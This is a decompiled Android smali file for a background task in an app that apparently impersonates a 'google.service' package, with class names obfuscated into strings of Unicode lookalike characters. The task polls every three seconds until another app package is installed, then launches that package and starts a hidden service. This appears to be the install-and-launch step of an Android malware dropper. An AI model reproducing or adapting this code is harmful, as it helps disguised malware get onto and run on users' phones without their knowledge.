.class Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779$findinstalldir;
.super Landroid/os/AsyncTask;
.source "\u02c8\u02be\u2db1\u05d9\u03c6\u02c9\u02ce$\u1d62\u02bb\u03b8\u1d62\u02cb\u02ce\u3164\u02ce\u2db1\u3164\u03c6\u02bf\u02bf\u02be\u02c8\u02c6\u02c9\u02c6\u2db1\u4240\u1d35\ufe73\u02ca\uff9e\u05d94779.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x2
    name = "findinstalldir"
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask<",
        "Ljava/lang/String;",
        "Ljava/lang/Void;",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# instance fields
.field final synthetic this$0:Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;


# direct methods
.method private constructor <init>(Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;)V
    .locals 0

    .line 61
    iput-object p1, p0, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779$findinstalldir;->this$0:Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    return-void
.end method

.method synthetic constructor <init>(Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779$1;)V
    .locals 0

    .line 61
    invoke-direct {p0, p1}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779$findinstalldir;-><init>(Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;)V

    return-void
.end method


# virtual methods
.method protected bridge synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 0

    .line 61
    check-cast p1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779$findinstalldir;->doInBackground([Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    return-object p1
.end method

.method protected doInBackground([Ljava/lang/String;)Ljava/lang/String;
    .locals 4

    const/4 p1, 0x0

    const/4 v0, 0x0

    .line 76
    :cond_0
    :try_start_0
    sget-object v1, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v2, 0xbb8

    invoke-virtual {v1, v2, v3}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    :catch_0
    add-int/lit8 v0, v0, 0x1

    .line 80
    :try_start_1
    sget-object v1, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->TP:Ljava/lang/String;

    iget-object v2, p0, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779$findinstalldir;->this$0:Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;

    invoke-virtual {v2}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    invoke-static {v1, v2}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->isPackageInstalled(Ljava/lang/String;Landroid/content/pm/PackageManager;)Z

    move-result v1

    if-eqz v1, :cond_1

    .line 82
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    sput-object p1, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->Holdit:Ljava/lang/Boolean;

    goto :goto_0

    :cond_1
    const/16 v1, 0xa

    if-ne v0, v1, :cond_2

    .line 88
    iget-object v1, p0, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779$findinstalldir;->this$0:Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;

    invoke-virtual {v1}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->CheckBind()V

    .line 104
    :cond_2
    sget-object v1, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->Holdit:Ljava/lang/Boolean;

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    if-nez v1, :cond_0

    :catch_1
    :goto_0
    const-string p1, "S!S@S#S$%"

    return-object p1
.end method

.method protected bridge synthetic onPostExecute(Ljava/lang/Object;)V
    .locals 0

    .line 61
    check-cast p1, Ljava/lang/String;

    invoke-virtual {p0, p1}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779$findinstalldir;->onPostExecute(Ljava/lang/String;)V

    return-void
.end method

.method protected onPostExecute(Ljava/lang/String;)V
    .locals 3

    .line 124
    :try_start_0
    sget-object p1, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->TP:Ljava/lang/String;

    iget-object v0, p0, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779$findinstalldir;->this$0:Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;

    invoke-virtual {v0}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    invoke-static {p1, v0}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->isPackageInstalled(Ljava/lang/String;Landroid/content/pm/PackageManager;)Z

    move-result p1

    if-eqz p1, :cond_0

    sget-object p1, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->TP:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object p1

    const-string v0, "null"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-nez p1, :cond_0

    .line 126
    iget-object p1, p0, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779$findinstalldir;->this$0:Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;

    invoke-virtual {p1}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    invoke-virtual {p1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object p1

    .line 127
    sget-object v0, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->TP:Ljava/lang/String;

    invoke-virtual {p1, v0}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object p1

    const/high16 v0, 0x10000000

    .line 128
    invoke-virtual {p1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 129
    iget-object v0, p0, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779$findinstalldir;->this$0:Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;

    invoke-virtual {v0, p1}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->startActivity(Landroid/content/Intent;)V

    .line 134
    :cond_0
    const-class p1, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;

    iget-object v0, p0, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779$findinstalldir;->this$0:Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;

    invoke-virtual {v0}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->getApplication()Landroid/app/Application;

    move-result-object v0

    invoke-static {p1, v0}, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47720;->sFhShxrBDUTiACGNcRtoCJ4818(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result p1

    if-eqz p1, :cond_1

    .line 135
    iget-object p1, p0, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779$findinstalldir;->this$0:Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;

    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779$findinstalldir;->this$0:Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;

    invoke-virtual {v1}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v0}, Lgoogle/service/ˈʾⶱיφˉˎ$ᵢʻθᵢˋˎㅤˎⶱㅤφʿʿʾˈˆˉˆⶱ䉀ᴵﹳˊﾞי4779;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_1
    return-void
.end method
